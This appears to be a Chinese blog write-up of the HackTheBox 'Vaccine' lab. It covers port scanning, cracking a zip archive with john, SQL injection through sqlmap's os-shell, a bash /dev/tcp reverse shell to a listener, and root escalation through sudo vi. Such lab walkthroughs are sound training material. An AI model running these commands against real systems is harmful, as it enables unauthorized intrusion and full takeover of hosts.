---
title: HackTheBox-Vaccine
date: 2021-07-13 17:05:21
categories:
- 渗透测试
tags:
- HackTheBox
---

## 实验环境

![Screenshot_2021-08-04_09_35_14](https://i.loli.net/2021/08/04/U3xgdw1fhKWpVOr.png)

## 信息收集

**端口扫描：**

```
nmap -sC -sV 10.10.10.46
```

![Screenshot_2021-08-02_11_35_34](https://i.loli.net/2021/08/04/cSyZNgzVdBa5Ff7.png)

看到21、22、80端口开放，先访问80端口，是一个登录界面，目前我们没有登录的账号密码

![Screenshot_2021-08-02_11_38_54](https://i.loli.net/2021/08/04/N5EBSjFbAIY6vWH.png)

因为上一题中我们得到了一个ftp的账户密码，先试试能不能ftp登录

```
ftpuser/mc@F1l3ZilL4
```

![Screenshot_2021-08-02_11_40_03](https://i.loli.net/2021/08/04/AhkG7aVn2xTKqis.png)

直接输入上一题中获得的用户名和密码可以成功登录

![Screenshot_2021-08-02_11_40_34](https://i.loli.net/2021/08/04/tSLqMYIKn7vD8U6.png)

可以看到有一个备份文件，我们先下载下来，但是这个文件需要解压密码

![Screenshot_2021-08-02_11_40_55](https://i.loli.net/2021/08/04/LosvlPx8rnfRt14.png)

我们直接使用john来爆破

```
zip2john backup.zip > hash
john hash
#因为我已经爆破过一次，所以可以直接show输出
john hash --show
```

![Screenshot_2021-08-02_11_47_56](https://i.loli.net/2021/08/04/Hwrq7FKaskilPIb.png)

得到压缩包密码`7418529630`，解压后有`index.php`，从代码中可以看到用户名和md5加密的密码

![Screenshot_2021-08-02_11_48_29](https://i.loli.net/2021/08/04/iyYwxIrSdV7XqMZ.png)

将md5加密的密码到在线的md5解密网站解密，得到密码为`qwerty789`

![Screenshot_2021-08-02_11_49_39](https://i.loli.net/2021/08/04/UFo8ZqT6aGQAnXx.png)

回到80端口的登录界面，用获得的用户名和密码登录，登录后的页面如下

![Screenshot_2021-08-02_14_15_39](https://i.loli.net/2021/08/04/EAakCZPVnoef5Xy.png)

## 实验过程

试试搜索处有没有常见漏洞，加单引号报错，应该是有sql注入

![Screenshot_2021-08-02_14_15_53](https://i.loli.net/2021/08/04/jg25tFavkQpoWOK.png)

那就直接用sqlmap跑，注意cookie要改成自己的值

```
sqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie="PHPSESSID=1ah5j9312pm8sf4sktan1gdll1"
```

![Screenshot_2021-08-03_09_22_43](https://i.loli.net/2021/08/04/jUadD1cT6WE5rbF.png)

![Screenshot_2021-08-03_09_26_33](https://i.loli.net/2021/08/04/DI6yXtBQwH3mWh7.png)

可以看到确实存在sql注入，数据库为PostgreSQL，试试直接用os-shell获取shell

```
sqlmap -u 'http://10.10.10.46/dashboard.php?search=a --cookie="PHPSESSID=1ah5j9312pm8sf4sktan1gdll1" --os-shell
```

![Screenshot_2021-08-03_09_27_03](https://i.loli.net/2021/08/04/oZdn7klxfEm3GFS.png)

接下来反弹shell，开启一个监听端口

![Screenshot_2021-08-03_09_27_50](https://i.loli.net/2021/08/04/5f4KBE9dTXrsLCM.png)

在sqlmap的shell中输入

```
bash -c 'bash -i >& /dev/tcp/10.10.15.60/1234 0>&1'
```

![Screenshot_2021-08-03_09_28_01](https://i.loli.net/2021/08/04/unHZq8YvKEdWI9A.png)

成功接收到反弹的shell

![Screenshot_2021-08-03_09_28_19](https://i.loli.net/2021/08/04/bLkCnr7FzU91yIQ.png)

![Screenshot_2021-08-03_09_29_41](https://i.loli.net/2021/08/04/HlFhMeK94sSOwQY.png)

先看一下存在注入的页面，有没有更多可以利用的信息，发现有数据库连接的用户名和密码

![Screenshot_2021-08-03_09_31_35](https://i.loli.net/2021/08/04/HMa2TXgmqjdvEc6.png)

接下来先得到交互式的shell

```
#看别的walkthrough说是两个都可以，但是我用第一个不行
SHELL=/bin/bash script -q /dev/null
python3 -c "import pty;pty.spawn('/bin/bash')"
```

得到交互式的shell后，可以通过`sudo -l`命令查看当前用户的权限，用户被允许编辑配置文件`/etc/postgresql/11/main/pg_hba.conf`，可以利用`vi`并验证密码提权至`root`

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

![Screenshot_2021-08-03_09_33_34](https://i.loli.net/2021/08/04/4LZdbeGSapqOo3N.png)

![Screenshot_2021-08-03_09_34_36](https://i.loli.net/2021/08/04/W3egOjsi6xoAfYa.png)

输入密码验证后，会出现字符重叠，直接执行如下命令并回车即可获得`root`权限

```
:!/bin/bash
```

![Screenshot_2021-08-03_09_35_30](https://i.loli.net/2021/08/04/lRPNKFJmw2753eE.png)

最后就可以读取root的flag了

![Screenshot_2021-08-03_09_36_08](https://i.loli.net/2021/08/04/8PUE5M2Z7yuw4eH.png)



> 参考：
>
> https://www.echocipher.life/index.php/archives/891/

